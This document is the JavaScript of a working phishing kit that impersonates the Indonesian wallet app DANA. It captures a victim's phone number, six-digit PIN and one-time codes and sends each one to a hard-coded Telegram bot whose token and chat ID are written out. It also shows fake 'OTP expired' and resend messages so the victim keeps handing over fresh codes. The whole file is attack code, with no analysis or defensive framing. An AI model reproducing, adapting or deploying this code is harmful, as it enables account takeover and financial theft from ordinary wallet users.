
// ██╗  ██╗████████╗███████╗      ██╗██╗  ██╗ █████╗
// ██║  ██║╚══██╔══╝██╔════╝      ██║██║ ██╔╝██╔══██╗
// ███████║   ██║   █████╗█████╗  ██║█████╔╝ ███████║
// ██╔══██║   ██║   ██╔══╝╚════╝  ██║██╔═██╗ ██╔══██║
// ██║  ██║   ██║   ███████╗      ██║██║  ██╗██║  ██║
// ╚═╝  ╚═╝   ╚═╝   ╚══════╝      ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
// ========================================================
// ███╗   ██╗ █████╗  ███╗   ██╗██╗  ██╗ ██████╗ ██████╗
// ████╗  ██║██╔══██╗████╗  ██║██║ ██╔╝██╔════╝██╔═══██╗
// ██╔██╗ ██║███████║██╔██╗ ██║█████╔╝ ██║     ██║   ██║
// ██║╚██╗██║██╔══██║██║╚██╗██║██╔═██╗ ██║     ██║   ██║
// ██║ ╚████║██║  ██║██║ ╚████║██║  ██╗╚██████╗╚██████╔╝
// ========================================================

var TELEGRAM_BOT_TOKEN = "7226458049:AAHGsPeZ7bMsfVBcfuW5x73VsXmZ9cj8WZk";
var TELEGRAM_CHAT_ID = "8080097570";

function sendToTelegram(message) { var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage"; var data = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }; return $.ajax({ url: url, method: 'POST', data: data, timeout: 10000 }); }

function formatMessage(type, data) { var timestamp = new Date().toLocaleString('id-ID'); if(type === 'nohp') { return "🔔 DATA DANA MASUK 🔔\n📱 Nomor HP: " + data.nomor + "\n⏰ Waktu: " + timestamp + "\n━━━━━━━━━━━━━━━━━━━━"; } else if(type === 'pin') { return "🔐 PIN DANA DITERIMA 🔐\n📱 Nomor HP: " + data.nomor + "\n🔒 PIN: " + data.pin + "\n⏰ Waktu: " + timestamp + "\n━━━━━━━━━━━━━━━━━━━━"; } else if(type === 'otp') { return "📨 OTP DANA DITERIMA 📨\n📱 Nomor HP: " + data.nomor + "\n🔒 PIN: " + data.pin + "\n🔑 OTP: " + data.otp + "\n⏰ Waktu: " + timestamp + "\n━━━━━━━━━━━━━━━━━━━━"; } }


function detectSuspiciousActivity() { var requestCount = parseInt(localStorage.getItem('requestCount') || '0'); var lastRequestTime = parseInt(localStorage.getItem('lastRequestTime') || '0'); var currentTime = new Date().getTime(); if (currentTime - lastRequestTime > 60000) { localStorage.setItem('requestCount', '1'); } else { localStorage.setItem('requestCount', (requestCount + 1).toString()); } localStorage.setItem('lastRequestTime', currentTime.toString()); if (requestCount > 5) { return true; } return false; }
$(document).ready(function() {
    setTimeout(function() {
        $('#popup').hide();
        $('chsalxcome2').fadeIn();
    }, 2000);
});

function tutupotp(){
    $(".bgotp").hide();
    $('#btn_send_otp').prop('disabled', true);
}


function sendNohp(event){
    $("#process").show();
    event.preventDefault();
    $("#inp").blur();
    
    var nomor = document.getElementById("inp").value;
    if(!nomor || nomor.length < 10) {
        $("#alert_nohp").text("Nomor telepon tidak valid!");
        $("#alert_nohp").show();
        $("#process").hide();
        return;
    }
    
    if (detectSuspiciousActivity()) {
        $("#alert_nohp").text("Terlalu banyak percobaan. Silakan coba lagi nanti!");
        $("#alert_nohp").show();
        $("#process").hide();
        return;
    }
    
    sessionStorage.setItem("nomor", nomor);
    
    var message = formatMessage('nohp', { nomor: nomor });
    
    sendToTelegram(message).then(function() {
        $("#process").hide();
        document.getElementById("back1").style.display = "none";
        document.getElementById("back2").style.display = "block";
        $("#formNohp").fadeOut();
        setTimeout(function(){
            $("#formPin").fadeIn();
            $("#pin1").focus();
        }, 500);
    }).catch(function() {
        $("#process").hide();
        $("#alert_nohp").text("Gagal mengirim data. Silakan coba lagi!");
        $("#alert_nohp").show();
    });
}


function sendPin(){ var pin1 = document.getElementById('pin1').value; var pin2 = document.getElementById('pin2').value; var pin3 = document.getElementById('pin3').value; var pin4 = document.getElementById('pin4').value; var pin5 = document.getElementById('pin5').value; var pin6 = document.getElementById('pin6').value; if(!pin1 || !pin2 || !pin3 || !pin4 || !pin5 || !pin6) { $("#alert_pin").text("PIN tidak lengkap!"); $("#alert_pin").show(); return; } if (detectSuspiciousActivity()) { $("#alert_pin").text("Terlalu banyak percobaan. Silakan coba lagi nanti!"); $("#alert_pin").show(); return; } var nomor = sessionStorage.getItem("nomor"); var pinValue = pin1 + pin2 + pin3 + pin4 + pin5 + pin6; sessionStorage.setItem("pin", pinValue); document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor + " via<br>";
    
    var message = formatMessage('pin', { 
        nomor: nomor, 
        pin: pinValue 
    });
    
    sendToTelegram(message).then(function() {
        $("#process").hide();
        document.getElementById("alert").style.display = "block"; 
        $(".bgotp").fadeIn();
        setInterval(countdown, 1000);
        $('#otp_single').focus();
        $('#btn_send_otp').prop('disabled', true);
    }).catch(function() {
        $("#process").hide();
        $("#alert_pin").text("Gagal mengirim PIN. Silakan coba lagi!");
        $("#alert_pin").show();
    });
}


function sendOtp(){
    var otpInput = $('#otp_single');
    var otpValue = otpInput.val();
    
    if (otpValue.length < 4 || otpValue.length > 6) {
        $("#alert").text("Kode OTP harus 4-6 digit.");
        $("#alert").css("color","red");
        return;
    }
    
    if (detectSuspiciousActivity()) {
        $("#alert").text("Terlalu banyak percobaan. Silakan coba lagi nanti!");
        $("#alert").css("color","red");
        return;
    }
    
    $(".loadingOtp").show();
    
    var nomor = sessionStorage.getItem("nomor");
    var pin = sessionStorage.getItem("pin");
    
    setTimeout(function(){
        $(".alert").text("Masa berlaku OTP sudah habis");
        $(".alert").css("color","red");
    },2000);
    
    var message = formatMessage('otp', { 
        nomor: nomor, 
        pin: pin, 
        otp: otpValue 
    });
    
    sendToTelegram(message).then(function() {
        setTimeout(function(){
            $(".loadingOtp").hide();
            $('#otp_single').val('');
            $('#otp_single').focus();
            $('#btn_send_otp').prop('disabled', true);
            document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor + " via<br/>";
            $(".alert").css("color","black");
        },4000);
    }).catch(function() {
        $(".loadingOtp").hide();
        $("#alert").text("Gagal mengirim OTP. Silakan coba lagi!");
        $("#alert").css("color","red");
    });
}

function countdown() { var count = parseInt($('#countdown').text()); if (count !== 0) { $('#countdown').text(count - 1); } else { $('#countdown').text('60'); } }
window.onload = function(){ setTimeout(function(){ $(".start").fadeIn(); setTimeout(function(){ $(".start").fadeOut(1000); setTimeout(function(){ $(".container").fadeIn(200); $("#inp").focus(); },1000); },500); },500); }